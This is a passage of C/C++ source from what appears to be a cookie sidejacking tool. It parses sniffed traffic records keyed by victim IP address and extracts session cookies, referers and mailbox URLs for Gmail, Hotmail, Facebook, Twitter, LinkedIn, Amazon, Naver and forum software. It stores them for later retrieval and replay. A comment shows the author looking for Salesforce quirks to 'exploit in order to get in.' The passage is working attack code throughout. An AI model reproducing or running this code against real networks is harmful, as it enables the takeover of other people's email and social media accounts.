				if (1 || contains(url, url_length, "FolderID=00000000-0000-0000-0000-000000000001")) {
					db.add_url2(instance, domain, url);
				}
			}
		}

		//http://webmail.att.net/wmc/v/wm/476AA0AB000C70B0000058C62224332282?cmd=List&sid=c0&from=wmgoto
		if (ends_with(domain, "webmail.att.net")) {
			if (starts_with(url, url_length, "/wmc/v/wm/")) {
				if (contains(url, url_length, "cmd=List")) {
					db.add_url2(instance, domain, url);
				}
			}
		}


		if (get_item("Referer:", line, referer))
			db.add_url_referer(instance, domain, url, referer);
		else
			db.add_url_referer(instance, domain, url, "");
		return;
	}

	/*
	 * Cookie
		Instance: 10.0.0.43
		Domain: mail.google.com
		Path: /mail/channel/bind
		Name: NYip
		Value: 10.140.2.198
	*/
	if (get_item("Path:", line, path)) {
		while (*path == '.')
			memmove(path, path+1, strlen(path));
		while (*path && path[strlen(path)-1]=='.')
			path[strlen(path)-1] = '\0';


		/* Salesforce.com in the default mode is fully encrypted and
		 * cannot be hijacked, but has some other quirks that I might
		 * be able to exploit in order to get in. These bits are for
		 * me to test with */
		if (ends_with(domain, "salesforce.com")) {
			strcpy(domain, "salesforce.com");
			strcpy(path, "/");
		}

		if (stricmp(domain, "search.yahoo.com")==0 || stricmp(domain, "rds.yahoo.com")==0 || stricmp(domain, "us.bc.yahoo.com") == 0) {
			memcpy(path, "/", 2);
			strcpy(domain, "yahoo.com");
		}


		/*do_truncate(path, "/html.ng/");
		do_truncate(path, "/cms/");
		do_truncate(path, "/mail/");
		do_truncate(path, "/promotions/");
		do_truncate(path, "/v/");*/

		if (ends_with(path, ".jpg") || ends_with(path, ".gif") || ends_with(path, ".js") || 
			ends_with(path, ".css") || ends_with(path, ".png") || ends_with(path, ".ico")) {
			int x = strlen(path);

			while (x && path[x-1] != '/')
				x--;

			path[x] = '\0';
		}
		while (path[0] && path[1] && ends_with(path, "/"))
			path[strlen(path)-1] = '\0';

		/* Get name of the name/value pair */
		if (get_item("Name:", line, name)) {
			if (stricmp(name, "Expires") == 0)
				return;

			/* Hotmail */
			if (ends_with(domain, ".hotmail.msn.com") && starts_with(path, strlen(path), "/cgi-bin/HoTMaiL")) {
				db.add_url2(instance, domain, path);
			}
			if (ends_with(domain, ".mail.live.com") && starts_with(path, strlen(path), "/mail")) {
				do_truncate(path, "/mail");
			}

			/* SlashDot */
			if (stricmp(name, "user") == 0 && ends_with(domain, "slashdot.org")) {
				db.add_url2(instance, "slashdot.org", "/");
			}

			/* Canadian Broadcasting */
			if (stricmp(name, "MyCBCSignInValue") == 0 && ends_with(domain, "cbc.ca")) {
				db.add_url2(instance, "www.cbc.ca", "/");
			}

			/* Amazon.com */
			if (stricmp(name, "session-id") == 0 && ends_with(domain, "amazon.com")) {
				db.add_url2(instance, "www.amazon.com", "/");
			}

			/* Twitter.com */
			if (stricmp(name, "_twitter_sess") == 0 && ends_with(domain, "twitter.com")) {
				db.add_url2(instance, "www.twitter.com", "/");
			}

			/* Naver.com (Korean mail) */
			if (stricmp(name, "NID_SES") == 0 && ends_with(domain, "mail.naver.com")) {
				db.add_url2(instance, "mail.naver.com", "/");
			}

			if (stricmp(name, "JSESSIONID") == 0 && ends_with(domain, "webmail.ca.rr.com")) {
				db.add_url2(instance, "http://webmail.ca.rr.com", "/do/mail/refreshInbox?update=true&l=en-US&v=standard");
			}
			

			/* phpbb -- like on sourceforge.net */
			if (name[0] == 'p' && name[1] == 'h') {
				if (strnicmp(path, "/forum/", 7) == 0) {
					if (starts_with(name, strlen(name), "phpbb_")) {
						db.add_url2(instance, domain, "/forum");
						path[7] = '\0';
					}
				}
			}

			/* PHPSESSID -- like on sourceforge.net */
			if (name[0] == 'P' && name[1] == 'H' && strcmp(name, "PHPSESSID") == 0) {
				db.add_url2(instance, domain, "/");
			}

			/* Yahoo? */
			if (name[0] == 'Y' && name[1] == 'L' && strcmp(name, "YLS") == 0 && ends_with(domain, "yahoo.com")) {
				db.add_url2(instance, "www.yahoo.com", "/");
			}

			/* Facebook */
			if (ends_with(domain, "facebook.com")) {
				if (stricmp(name, "ab_ff") == 0 || stricmp(name, "login_x") == 0 || stricmp(name, "__qca") == 0) {
					strcpy(domain, "facebook.com");
					strcpy(path, "/");
				}
				if (name[0] == 'l' && starts_with(name, strlen(name), "login") && ends_with(domain, "facebook.com")) {
					db.add_url2(instance, "www.facebook.com", "/");
				}
			}

			if (strcmp(name, "GMAIL_LOGIN")==0) {
				strcpy(path, "/");
				db.add_url2(instance, domain, "/");
			}
			if (strcmp(name, "GMAIL_RTT")==0) {
				strcpy(path, "/");
			}
			if (strcmp(name, "TZ")==0 && ends_with(domain, "google.com")) {
				strcpy(path, "/");
			}

			if (strcmp(name, "GX")==0 && ends_with(domain, "mail.google.com")) {
				strcpy(path, "/");
				strcpy(domain, "mail.google.com");
				db.add_url2(instance, "mail.google.com", "/mail");
			}

			if (ends_with(domain, "linkedin.com")) {
				strcpy(path, "/");
				if (stricmp(name,"JSESSIONID")==0 || stricmp(name,"session.rememberme")==0)
					db.add_url2(instance, "www.linkedin.com", "/");
			}

			if (ends_with(domain, "espn.go.com")) {
				strcpy(path, "/");
				strcpy(domain, "espn.go.com");
				db.add_url2(instance, "espn.go.com", "/");
			}

			/* Twitter */
			if (name[0] == '_' && name[1] == 't' && stricmp(name, "_twitter_session")==0 && ends_with(domain, "twitter.com")) {
				strcpy(domain, "twitter.com");
				strcpy(path, "/");
				db.add_url2(instance, "www.twitter.com", "/");
			}

			/* vBulletin Board */
			if (name[0] == 'b' && name[1] == 'b' && (stricmp(name,"bbsessionhash")==0 || stricmp(name,"bblastactivity")==0 || stricmp(name,"bblastvisit")==0)) {
				if (strstr(path, "/forums")) {
					char *newpath = strstr(path, "/forums/");
					if (newpath == NULL) {
						newpath = strstr(path, "/forums");
						newpath += strlen("/forums");
					} else
						newpath += strlen("/forums/");
					
					if (newpath != NULL)
						strcpy(newpath, "index.php");
				} else
					strcpy(path, "/");
				
				db.add_url2(instance, domain, path);
			}

			if (get_item("Value:", line, value)) {

				/* Filter known cookies back to the original cookies back to where
				 * they should be assigned to */
				filter_cookie(domain, path, name);

				db.add_cookie(instance, domain, path, name, value);
				return;
			}
		}

	}

	printf("hamster.txt: unknown entry contents\n");
}

extern "C" void
cookiedb_read_file_handle(FILE *fp)
{
	/*
	 * Loop through all the data chunks. A single chunk
	 * of data is multiple lines of input
	 */
	for (;;) {
		char line[5000];
		unsigned line_offset = 0;

		/* Get a multi-line chunk */
		while (line_offset + 2 < sizeof(line)) {
			char *p = line+line_offset;
			unsigned p_max = sizeof(line)-line_offset;
			unsigned p_len;

			/* Get the next line */
			if (fgets(p, p_max, fp) == NULL) {
				*p = '\0';
				break;
			}

			/* Strip the whitespace from the end of the line */
			p_len = strlen(p);
			while (p_len && isspace(p[p_len-1]))
				p_len--;

			/* Nul terminate every string within a chunk */
			p[p_len] = '\0';

			/* Stop reading a chunk when we get a blank line */
			if (p_len == 0)
				break;

			/* Move forward the length of the line in the buffer */
			line_offset += p_len + 1; /*include the nul terminator */
		}

		/* Process the chunk */
		if (*line == '\0')
			break;
		cookiedb_read_chunk(line, line_offset);
	}
}

/**
 * Read a bunch of data blocks from a file
 */
extern "C" void 
coookiedb_read_file(const char *filename, void *v)
{
	FILE *fp;
	fpos_t *position = (fpos_t*)v;

	//printf("%s\n", filename);
	fp = fopen(filename, "rt+");
	if (fp == NULL) {
		if (strstr(filename, "old") == NULL)
			fp=NULL; //perror(filename);
		return;
	}

	/*
	 * Set the position in the file to be the same as the
	 * previous position in this file. This allows us to 
	 * monitor a file for additions over time.
	 */
	if (position)
		fsetpos(fp, position);
	
	cookiedb_read_file_handle(fp);
	
	/* Get the position where we ended up. Next time we read
	 * this same file, we'll just start where we left off */
	if (position)
		fgetpos(fp, position);

	fclose(fp);

}


static void
get_cookie_variable(const char *buf, unsigned buf_length, const char *varname, const char **result, unsigned *result_length)
{
	unsigned i;
	unsigned varname_length = strlen(varname);

	*result = "";
	*result_length = 0;

	for (i=0; i<buf_length; i++) {
        while (i<buf_length && isspace(buf[i]))
            i++;

        if (buf_length - i > varname_length && strnicmp(buf+i, varname, varname_length) == 0) {
            i += varname_length;

			/* skip whitespace */
            while (i<buf_length && isspace(buf[i]))
                i++;

			if (buf[i] == ';') {
				*result = "true";
				*result_length = 4;
				return;
			}

			/* skip equals sign */
            if (i+1 >= buf_length || buf[i] != '=')
                continue;
			else
				i++;

			/* skip whitespace */
            while (i<buf_length && isspace(buf[i]))
                i++;

            *result = buf+i;
            for ((*result_length)=0; (*result_length)+i<buf_length && (*result)[(*result_length)] != ';'; (*result_length)++)
                ;
			return;
        } else {
            while (i<buf_length && buf[i] != ';')
                i++;
        }
    }
}

extern "C" void
cookiedb_SET_COOKIE(const char *instance, const char *in_domain, const char *buf, unsigned buf_length)
{
    const char *path = "/";
    unsigned path_length=1;
    const char *name;
    unsigned name_length;
    const char *value;
    unsigned value_length;
    const char *domain = NULL;
    unsigned domain_length = 0;
	const char *expires = NULL;
	unsigned expires_length = 0;
	const char *secure = NULL;
	unsigned secure_length = 0;
	const char *httponly = NULL;
	unsigned httponly_length = 0;

    unsigned i;

	get_cookie_variable(buf, buf_length, "path", &path, &path_length);
	get_cookie_variable(buf, buf_length, "domain", &domain, &domain_length);
	get_cookie_variable(buf, buf_length, "expires", &expires, &expires_length);
	get_cookie_variable(buf, buf_length, "secure", &secure, &secure_length);
	get_cookie_variable(buf, buf_length, "HttpOnly", &httponly, &httponly_length);	
    
	if (domain == NULL || domain_length == 0) {
		domain = in_domain;
		domain_length = strlen(in_domain);
    }

    /*
     * Get the name/value pairs
     */
    for (i=0; i<buf_length; ) {

		/* Skip whitespace */
        while (i<buf_length && isspace(buf[i]))
            i++;

		/* Extract name */
        name = buf+i;
        for (name_length=0; i+name_length<buf_length && name[name_length]!='=' && name[name_length]!=';'; name_length++)
            ;
        i += name_length;
        while (name_length && isspace(name[name_length-1]))
            name_length--;
        if (i<buf_length && buf[i]==';')
            continue; /* ignore things like "secure; HttpOnly;"*/
        if (i<buf_length && buf[i]=='=')
            i++;
        while (i<buf_length && isspace(buf[i]))
            i++;

        /* Extract the value */
        value = buf+i;
        for (value_length=0; value_length+i<buf_length && value[value_length] != ';'; value_length++)
                ;
        i += value_length;

        if (i < buf_length && buf[i] == ';')
            i++;

        if ((name_length == 4 && strnicmp(name,"path",4)==0) || (name_length==6 && strnicmp(name,"domain",6)==0) || (name_length==7 && strnicmp(name,"expires",7)==0))
            continue;

		while (domain_length && *domain == '.') {
			domain++;
			domain_length--;
		}

		if (memcmp(domain, "mail.google.com", strlen("mail.google.com")) == 0 && memcmp(value, "EXPIRED", 7) == 0)
			continue;
        db.add_cookie(instance,
                domain, domain_length,
                path, path_length,
                name, name_length,
                value, value_length);

    }
}



extern "C" char *
cookiedb_GET_COOKIE(const char *instance, const char *domain, const char *path)
{
	return db.retrieve_cookies(instance, domain, path);
}

extern "C" char *
cookiedb_GET_SETCOOKIE(const char *instance, const char *domain, const char *path)
{
	return db.retrieve_setcookies(instance, domain, path);
}

extern "C" char *
cookiedb_GET_REFERER(const char *instance, const char *domain, const char *path)
{
	return db.retrieve_referer(instance, domain, path);
}
